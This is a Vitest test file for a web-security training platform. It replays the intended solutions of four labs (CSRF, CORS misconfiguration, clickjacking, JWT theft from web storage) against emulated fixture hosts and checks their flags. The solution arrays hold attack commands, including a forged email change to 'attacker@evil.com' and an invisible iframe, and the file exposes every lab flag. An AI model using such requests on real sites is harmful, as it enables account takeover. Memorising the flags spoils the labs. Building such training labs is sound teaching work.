import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the WEB labs batch B6
// (web-csrf, web-cors-deep, web-clickjacking, web-webstorage). Each entry loads
// the REAL fixture bundle, mirrors the lesson `lab:` block, replays the intended
// solution with the emulated shell/tools and asserts `check` passes.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-csrf', flag: 'nto{csrf_n0_t0k3n_3ma1l_ch4ng3}', hints: 4,
    check: "grep -q 'nto{' found.txt",
    solution: [
      `curl -s https://shop.local/profile -H 'Cookie: session=alice' > profile.html`,
      `curl -s -X POST https://shop.local/profile/email -d 'email=attacker@evil.com' -H 'Cookie: session=alice' > found.txt`,
    ],
  },
  {
    id: 'web-cors-deep', flag: 'nto{c0rs_r3fl3ct3d_0r1g1n_w1th_cr3ds}', hints: 4,
    check: "grep -q 'nto{' found.txt",
    solution: [
      `curl -s -i https://api.shop.local/me -H 'Origin: https://evil.local' -b 'session=victim' > found.txt`,
    ],
  },
  {
    id: 'web-clickjacking', flag: 'nto{cl1ckj4ck3d_3ma1l_ch4ng3}', hints: 4,
    check: "grep -q 'opacity' clickjack.html && grep -q 'nto{' found.txt",
    solution: [
      `echo '<iframe src="https://victim.com/account/email" style="opacity:0.0001"></iframe>' > clickjack.html`,
      `curl -s -X POST https://victim.com/account/email -d 'email=attacker@evil.com' -H 'Cookie: session=victim' > found.txt`,
    ],
  },
  {
    id: 'web-webstorage', flag: 'nto{l0c4lst0r4g3_t0k3n_th3ft}', hints: 4,
    check: "grep -q 'nto{' found.txt",
    solution: [
      `cut -d. -f2 access_token.jwt | base64 -d > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab B6: $id', ({ id, flag, hints, check, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
